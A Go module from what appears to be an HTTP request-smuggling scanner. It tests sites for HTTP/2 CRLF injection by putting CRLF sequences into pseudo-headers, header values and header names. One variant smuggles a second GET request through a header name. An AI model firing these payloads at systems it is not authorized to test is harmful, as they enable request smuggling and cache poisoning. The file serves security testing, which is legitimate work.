package modules

import (
	"fmt"
	"log"
	"net/url"
	"strings"
	"time"

	"request_smuggling/core"
	"request_smuggling/h2raw"
	"request_smuggling/payloads"
)

type H2CRLFInj struct {
	Timeout time.Duration
}

func (m *H2CRLFInj) Name() string { return "H2CRLF" }

func applyCRLFVariant(req *h2raw.Request, v payloads.CRLFVariant, target core.Target) {
	switch v.Target {
	case ":method":
		req.Method = req.Method + " HTTP/1.1\r\nX-Test: injected"
	case ":path":
		req.Path = req.Path + " HTTP/1.1\r\nX-Test: injected"
	case ":authority":
		req.Authority = req.Authority + "\r\nX-Test: injected"
	case "header:host":
		req.AddHeader("host", req.Authority+"\r\nX-Test: injected")
	case "header:user-agent":
		req.AddHeader("user-agent", "Mozilla/5.0\r\nX-Test: injected")
	case "header_name:crlf":
		headerName := "foo: bar\r\nX-Injected"
		req.AddHeader(headerName, "xyz")
	case "header_name:te_smuggle":
		headerName := "foo: bar\r\n" +
			"\r\n" +
			"GET /hopefully404 HTTP/1.1\r\n" +
			"Host: " + target.Host
		req.AddHeader(headerName, "xyz")
	}
}

func (m *H2CRLFInj) Run(ctx core.ScanContext) ([]core.Finding, error) {
	target := ctx.Target
	var findings []core.Finding

	if !target.TLS {
		log.Printf("[H2CRLF] H2 requires TLS, skipping")
		return nil, nil
	}

	mutations := payloads.H2CRLFVariants()

	throttle := time.Tick(ctx.Options.RateInterval)

	for i := range target.Sitemap {
		rec := &target.Sitemap[i]
		if rec.Response.StatusCode == 0 {
			continue
		}
		u, _ := url.Parse(rec.Request.Endpoint)
		for _, v := range mutations {
			<-throttle

			client, conn, err := core.NewH2Connection(target)
			if err != nil {
				log.Printf("[H2CRLF] failed to create H2 connection: %v", err)
				continue
			}

			req := h2raw.NewRequest("GET", u.Scheme, u.Host, u.Path)

			for k, vs := range target.ExtraHeaders {
				for _, v := range vs {
					req.AddHeader(k, v)
				}
			}

			log.Printf("[H2CRLF] testing variant: %s -> %s", v.ID, v.Target)

			applyCRLFVariant(req, v, target)

			resp, err := client.MakeRequest(conn, req, 1)
			defer func() {
				if err := conn.Close(); err != nil {
					log.Printf("[%s] error closing connection: %v\n", m.Name(), err)

				}
			}()

			if err != nil {
				if strings.Contains(err.Error(), "PROTOCOL_ERROR") ||
					strings.Contains(err.Error(), "FRAME_SIZE_ERROR") {
					f := core.Finding{

						Module:   m.Name(),
						Details:  fmt.Sprintf("Protocol error after CRLF injection (%s)", v.ID),
						Evidence: fmt.Sprintf("Variant: %s\nTarget: %s\nError: %v", v.ID, v.Target, err),
						Severity: core.SeverityMedium,
					}
					findings = append(findings, f)

					if ctx.Options.ExitOnFind {
						return findings, nil
					}
					continue
				}
				log.Printf("[H2CRLF] error: %v", err)
				continue
			}

			if resp == nil {
				log.Printf("[H2CRLF] nil response for %s", v.ID)
				continue
			}

			if resp.Status == "200" {
				f := core.Finding{

					Module:  m.Name(),
					Details: fmt.Sprintf("CRLF injection successful! (%s)", v.ID),
					Evidence: fmt.Sprintf(
						"=== CRLF INJECTION DETECTED ===\n"+
							"Variant: %s\n"+
							"Injection point: %s\n"+
							"Response status: %s\n"+
							"=== END ===",
						v.ID, v.Target, resp.Status,
					),
					Severity: core.SeverityMedium,
				}

				if ctx.Options.ExitOnFind {
					*rec = enrichRecord(*rec, m.Name(), f)
					return []core.Finding{f}, nil
				}
				findings = append(findings, f)
				*rec = enrichRecord(*rec, m.Name(), f)
			}
		}

	}

	log.Printf("[H2CRLF] finished")
	return findings, nil
}
